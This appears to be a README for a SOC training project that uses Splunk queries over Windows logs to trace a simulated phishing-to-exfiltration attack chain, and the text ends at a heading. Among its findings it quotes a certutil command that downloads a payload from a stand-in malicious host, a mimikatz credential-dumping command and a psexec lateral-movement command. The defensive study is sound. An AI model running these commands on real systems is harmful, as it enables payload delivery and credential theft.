# SOC Investigation Project: Phishing → LoLBins → RDP → Data Exfiltration

## 📌 Overview

This project simulates a real-world SOC investigation using Windows logs analyzed in Splunk.

The objective is to detect and analyze a full attack chain including:

- Phishing (malicious document)
- PowerShell execution
- Living Off The Land techniques
- Credential dumping
- Lateral movement
- Command & Control (C2)
- Data exfiltration

---

## 🛠️ Tools

- Splunk
- Windows Event Logs

---

## Attack Scenario
### SOC SCENARIO 

An alert indicates suspicious activity on a user workstation (WIN-WS01).
I need to investigate to determine if there has been a compromise.

---
 ## Investigation Areas
 ### Initial detection (phishing)

 Objective: find the entry point

 ```
source="windows_logs.csv" host="cassandra-HP-EliteBook-850-G6" extracted_host=WIN-WS01 process=winword.exe 
| stats count by  user , proces, command_line
```
<img width="1909" height="812" alt="Capture d’écran du 2026-03-22 12-45-17" src="https://github.com/user-attachments/assets/28c92cbe-dff3-4dcc-bcde-b54bec925c07" />
File opened: invoice.docm
User: alice
Why suspicious:
The use of .docm files containing macros is a common phishing technique that allows code execution via Microsoft Word.
Conclusion: Initial access via phishing document.

### Payload execution

 Find out what happened after the document
 ```
source="windows_logs.csv" host="cassandra-HP-EliteBook-850-G6" extracted_host=WIN-WS01 process = powershell.exe 
| stats count by _time  user , command_line
 ```
Find out number of request with ``-enc``

```
 source="windows_logs.csv" host="cassandra-HP-EliteBook-850-G6" extracted_host=WIN-WS01 process = powershell.exe -enc
| stats count by  user , command_line
````
 <img width="1912" height="818" alt="image" src="https://github.com/user-attachments/assets/2769b740-2983-4220-a033-2dd64df14772" />
 
Encoded command present: (-enc)
Multiple runs: 150
Normal behavior?: NO
Using PowerShell to generate words is highly suspicious.

 Conclusion: the macro executed a malicious PowerShell payload.

 ### Living off the Land

 Search for repurposed Windows tools
 
```
Living off the Land (LotL) refers to a technique where an attacker uses legitimate tools already present on the system to carry out malicious actions, without deploying traditional malware.It’s like a thief entering your house and using your own tools to break into your safe instead of bringing their own.
Why is it dangerous?

    No malware → less effective antivirus

    The activity resembles normal admin usage.

    Widely used in real-world attacks (APTs, ransomware)
```

powershell.exe, certutil.exe , wmic.exe , bitsadmin.exe , mshta.exe ,rundll32.exe are the common tools already present on the system used by the attackers

```
source="windows_logs.csv" host="cassandra-HP-EliteBook-850-G6"   process IN ("powershell.exe","certutil.exe","wmic.exe","bitsadmin.exe","mshta.exe","rundll32.exe")
| table user , command_line,extracted_host
| sort - count
```
<img width="1912" height="1017" alt="image" src="https://github.com/user-attachments/assets/fe6e3b84-b063-4232-9c2b-d2db514b2606" />

 Tools used:
PowerShell
certutil
wmic
bitsadmin
mshta
rundll32

Download command:
certutil -urlcache -split -f http://malicious.site/payload.exe
Affected machines: multiple hosts (spread activity)
These are legitimate Windows binaries abused for attacks.
Conclusion: Living-off-the-land technique used to stay stealthy.

##  Key Findings

- Suspicious process chain:
  winword.exe → powershell.exe

- Encoded PowerShell detected:
  powershell -enc

- Credential dumping:
  mimikatz sekurlsa::logonpasswords

- Lateral movement:
  psexec \\WIN-DB01

---

## 📊 Splunk Queries

### Detect PowerShell encoded
